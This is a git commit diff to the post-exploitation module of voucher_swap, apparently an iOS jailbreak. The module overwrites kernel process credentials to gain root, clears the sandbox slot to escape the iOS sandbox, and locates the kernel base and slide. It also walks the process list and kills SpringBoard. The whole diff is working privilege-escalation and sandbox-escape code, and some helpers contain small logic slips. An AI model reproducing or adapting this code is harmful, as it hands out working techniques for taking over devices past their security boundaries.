3df57cae36da99a179a3423aa04e236e6d75d27a
Alticha <27830005+Alticha@users.noreply.github.com>
2019-02-08 02:58:43 +0000

    Add files via upload

--- voucher_swap/post/post.m
+++ voucher_swap/post/post.m
@@ -5,31 +5,26 @@
 #import "offsets.h"
 #include <sys/sysctl.h>
 #include "parameters.h"
+#include "patchfinder64.h"
+#include <UIKit/UIDevice.h>
+#include <sys/utsname.h>
+#include "log.h"
 
 @implementation Post
 
 // Debugging //
 
 - (void)debug {
-    bool wasMobile = [self isMobile];
-    uid_t uid = 0;
-    gid_t gid = 0;
-    if (!wasMobile) {
-        uid = getuid();
-        gid = getgid();
-        [self mobile];
-    }
+    [self save];
+    [self mobile];
     // Breakpoint
-    if (!wasMobile) {
-        [self setUID:uid];
-        [self setGID:gid];
-    }
+    [self restore];
 }
 
 // Variables //
 
 static uint64_t SANDBOX = 0;
-static uint64_t kernel_base = 0;
+static int SAVED_SET[3] = { 0, 0, 0 };
 
 // General post-exploitation method //
 
@@ -42,16 +37,127 @@ static uint64_t kernel_base = 0;
     [self root];
     // Unsandbox
     [self unsandbox];
-    // Kernel slide and kernel base
-    kernel_slide_init();
-    kernel_base = kernel_slide + STATIC_ADDRESS(kernel_base);
+    // If we can, initialise patchfinder64
+    [self initialise_patchfinder64];
     // Did we succeed?
-    bool success = [self isRoot] && [self isSandboxed];
-    if (success) printf("[POST] Success!\n");
-    if (!success) printf("[POST] Failed.\n");
+    bool success = [self isRoot] && ![self isSandboxed];
+    if (success) INFO("Post-exploitation was successful!");
+    if (!success) INFO("Post-exploitation failed.");
     // For debugging purposes
     //[self debug];
     return success;
+}
+
+// patchfinder64 //
+
+- (void)initialise_patchfinder64 {
+    if (patchfinder64_is_initialised()) return;
+    if ([self is16KAndIsNotA12]) {
+        // Kernel base
+        uint64_t base = [self kernelBase];
+        // Initialise patchfinder64
+        init_patchfinder64(base);
+        INFO("Initialised patchfinder64");
+    }
+}
+
+- (void)terminate_patchfinder64 {
+    if (!patchfinder64_is_initialised()) return;
+    if ([self is16KAndIsNotA12]) {
+        // Terminate patchfinder64
+        term_patchfinder64();
+        INFO("Terminated patchfinder64");
+    }
+}
+
+// Kernel base/slide //
+
+- (uint64_t)kernelSlide {
+    if (!kernel_slide) kernel_slide_init();
+    INFO("Found kernel slide: 0x%llx", kernel_slide);
+    return kernel_slide;
+}
+
+- (uint64_t)kernelBase {
+    uint64_t kernel_base = [self kernelSlide] + STATIC_ADDRESS(kernel_base);
+    INFO("Found kernel base: 0x%llx", kernel_base);
+    return kernel_base;
+}
+
+// Checks //
+
+- (struct utsname)uname {
+    struct utsname u;
+    uname(&u);
+    return u;
+}
+
+- (int)modelDigitsBeforeComma {
+    struct utsname u = [self uname];
+    char read[257];
+    int ii = 0;
+    for (int i = 0; i < 256; i++) {
+        char chr = u.machine[i];
+        long num = chr - '0';
+        if (num == -4 || chr == 0) {
+            break;
+        }
+        if (num >= 0 && num <= 9) {
+            read[ii] = chr;
+            ii++;
+        }
+    }
+    read[ii + 1] = 0;
+    int digits = atoi(read);
+    return digits;
+}
+
+- (bool)is4K {
+    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
+        return true;
+    }
+    int digits = [self modelDigitsBeforeComma];
+    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
+        if (digits < 8) {
+            INFO("This is a 4K device");
+            return true;
+        }
+    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
+        if (digits < 6) {
+            INFO("This is a 4K device");
+            return true;
+        }
+    }
+    INFO("This is a 16K device");
+    return false;
+}
+
+- (bool)is16K {
+    return ![self is4K];
+}
+
+- (bool)isA12 {
+    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
+        return false;
+    }
+    int digits = [self modelDigitsBeforeComma];
+    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
+        if (digits == 11) {
+            INFO("This is an A12 device");
+            return true;
+        }
+    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
+        if (digits == 8) {
+            INFO("This is an A12 device");
+            return true;
+        }
+    }
+    INFO("This isn't an A12 device");
+    return false;
+}
+
+- (bool)is16KAndIsNotA12 {
+    return [self is16K] && ![self isA12];
 }
 
 // Users //
@@ -72,6 +178,17 @@ static uint64_t kernel_base = 0;
     kernel_write32(ucred + off_ucred_cr_uid, uid);
     kernel_write32(ucred + off_ucred_cr_ruid, uid);
     kernel_write32(ucred + off_ucred_cr_svuid, uid);
+    INFO("Overwritten UID to %i for proc 0x%llx", uid, proc);
+}
+
+- (void)setUID:(uid_t)uid forProc:(uint64_t)proc {
+    uint64_t ucred = kernel_read64(proc + off_p_ucred);
+    kernel_write32(proc + off_p_uid, uid);
+    kernel_write32(proc + off_p_ruid, uid);
+    kernel_write32(ucred + off_ucred_cr_uid, uid);
+    kernel_write32(ucred + off_ucred_cr_ruid, uid);
+    kernel_write32(ucred + off_ucred_cr_svuid, uid);
+    INFO("Overwritten UID to %i for proc 0x%llx", uid, proc);
 }
 
 - (void)setGID:(gid_t)gid {
@@ -81,26 +198,59 @@ static uint64_t kernel_base = 0;
     kernel_write32(proc + off_p_rgid, gid);
     kernel_write32(ucred + off_ucred_cr_rgid, gid);
     kernel_write32(ucred + off_ucred_cr_svgid, gid);
+    INFO("Overwritten GID to %i for proc 0x%llx", gid, proc);
+}
+
+- (void)setGID:(gid_t)gid forProc:(uint64_t)proc {
+    uint64_t ucred = kernel_read64(proc + off_p_ucred);
+    kernel_write32(proc + off_p_gid, gid);
+    kernel_write32(proc + off_p_rgid, gid);
+    kernel_write32(ucred + off_ucred_cr_rgid, gid);
+    kernel_write32(ucred + off_ucred_cr_svgid, gid);
+    INFO("Overwritten GID to %i for proc 0x%llx", gid, proc);
+}
+
+- (void)setUIDAndGID:(int)both {
+    [self setUID:both];
+    [self setGID:both];
+}
+
+- (void)setUIDAndGID:(int)both forProc:(uint64_t)proc {
+    [self setUID:both forProc:proc];
+    [self setGID:both forProc:proc];
 }
 
 - (void)root {
-    [self setUID:0];
-    [self setGID:0];
+    [self setUIDAndGID:0];
 }
 
 - (void)mobile {
-    [self setUID:501];
-    [self setGID:501];
+    [self setUIDAndGID:501];
 }
 
 // Sandbox //
 
 - (bool)isSandboxed {
-    return kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) == 0;
+    return kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
+}
+
+- (bool)isProcSandboxed:(uint64_t)proc {
+    return kernel_read64(kernel_read64(kernel_read64(proc + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
 }
 
 - (void)sandbox {
     uint64_t proc = [self selfproc];
+    INFO("Sandboxed proc 0x%llx", proc);
+    if ([self isSandboxed]) return;
+    uint64_t ucred = kernel_read64(proc + off_p_ucred);
+    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
+    kernel_write64(cr_label + off_sandbox_slot, SANDBOX);
+    SANDBOX = 0;
+}
+
+- (void)sandbox:(uint64_t)proc {
+    INFO("Sandboxed proc 0x%llx", proc);
+    if ([self isSandboxed]) return;
     uint64_t ucred = kernel_read64(proc + off_p_ucred);
     uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
     kernel_write64(cr_label + off_sandbox_slot, SANDBOX);
@@ -109,6 +259,17 @@ static uint64_t kernel_base = 0;
 
 - (void)unsandbox {
     uint64_t proc = [self selfproc];
+    INFO("Unsandboxed proc 0x%llx", proc);
+    if (![self isSandboxed]) return;
+    uint64_t ucred = kernel_read64(proc + off_p_ucred);
+    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
+    if (SANDBOX == 0) SANDBOX = kernel_read64(cr_label + off_sandbox_slot);
+    kernel_write64(cr_label + off_sandbox_slot, 0);
+}
+
+- (void)unsandbox:(uint64_t)proc {
+    INFO("Unsandboxed proc 0x%llx", proc);
+    if (![self isSandboxed]) return;
     uint64_t ucred = kernel_read64(proc + off_p_ucred);
     uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
     if (SANDBOX == 0) SANDBOX = kernel_read64(cr_label + off_sandbox_slot);
@@ -122,6 +283,7 @@ static uint64_t kernel_base = 0;
     // i think the max pid value is 99998?
     for (pid_t i = 0; i < 99999; i++) {
         if (!kernel_read64(proc + off_p_next) /* if we can't read here, the previously read address was allproc */) {
+            INFO("Found allproc: 0x%llx\n", proc);
             return proc;
         }
         // not allproc - let's try this one?
@@ -131,11 +293,21 @@ static uint64_t kernel_base = 0;
 }
 
 - (uint64_t)selfproc {
-    return kernel_read64(current_task + OFFSET(task, bsd_info));
+    static uint64_t proc = 0;
+    if (!proc) {
+        proc = kernel_read64(current_task + OFFSET(task, bsd_info));
+        INFO("Found proc 0x%llx for PID %i", proc, getpid());
+    }
+    return proc;
 }
 
 - (uint64_t)kernproc {
-    return kernel_read64(kernel_task + OFFSET(task, bsd_info));
+    uint64_t proc = 0;
+    if (!proc) {
+        proc = kernel_read64(kernel_task + OFFSET(task, bsd_info));
+        INFO("Found proc 0x%llx for PID %i", proc, 0);
+    }
+    return proc;
 }
 
 - (uint64_t)proc_for_pid:(pid_t)pid {
@@ -146,52 +318,71 @@ static uint64_t kernel_base = 0;
     }
     uint64_t proc = [self allproc];
     while (proc) {
-        if (kernel_read32(proc + off_p_pid) == pid) return proc;
+        if (kernel_read32(proc + off_p_pid) == pid) {
+            INFO("Found proc 0x%llx for PID %i", proc, pid);
+            return proc;
+        }
         proc = kernel_read64(proc);
     }
     return 0;
 }
 
 - (pid_t)pid_for_name:(NSString *)name {
+    [self save];
+    [self root];
     static int maxArgumentSize = 0;
-    if (!maxArgumentSize) {
-        size_t size = sizeof(maxArgumentSize);
-        if (sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0) == -1) {
-            maxArgumentSize = 4096;
-        }
-    }
+    size_t size = sizeof(maxArgumentSize);
+    sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0);
     int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
     struct kinfo_proc *info;
     size_t length;
-    int count;
     sysctl(mib, 3, NULL, &length, NULL, 0);
     info = malloc(length);
     sysctl(mib, 3, info, &length, NULL, 0);
-    count = (int)length / sizeof(struct kinfo_proc);
-    for (int i = 0; i < count; i++) {
+    for (int i = 0; i < length / sizeof(struct kinfo_proc); i++) {
         pid_t pid = info[i].kp_proc.p_pid;
         if (pid == 0) {
             continue;
         }
         size_t size = maxArgumentSize;
         char *buffer = (char *)malloc(length);
-        if (sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0) == 0) {
-            NSString *executable = [NSString stringWithCString:(buffer+sizeof(int)) encoding:NSUTF8StringEncoding];
-            if ([executable isEqual:name]) {
-                return info[i].kp_proc.p_pid;
-            } else if ([[executable lastPathComponent] isEqual:name]) {
-                return info[i].kp_proc.p_pid;
-            }
-        }
+        sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0);
+        NSString *executable = [NSString stringWithCString:buffer + sizeof(int) encoding:NSUTF8StringEncoding];
         free(buffer);
+        if ([executable isEqual:name]) {
+            INFO("Found PID %i for name %s", pid, name.UTF8String);
+            free(info);
+            [self restore];
+            return pid;
+        } else if ([[executable lastPathComponent] isEqual:name]) {
+            INFO("Found PID %i for name %s", pid, name.UTF8String);
+            free(info);
+            [self restore];
+            return pid;
+        }
     }
     free(info);
-    return 0;
+    [self restore];
+    return -1;
 }
 
 - (void)respring {
     [self unsandbox];
-    kill([self pid_for_name:@"/usr/libexec/backboardd"], SIGKILL);
+    kill([self pid_for_name:@"/System/Library/CoreServices/SpringBoard.app/SpringBoard"], SIGTERM);
+}
+
+// Save/Restore //
+
+- (void)save {
+    SAVED_SET[0] = getuid();
+    SAVED_SET[1] = getgid();
+    SAVED_SET[2] = [self isSandboxed];
+}
+
+- (void)restore {
+    [self setUID:SAVED_SET[0]];
+    [self setGID:SAVED_SET[1]];
+    SAVED_SET[2] ? [self sandbox] : [self unsandbox];
 }
 
 @end
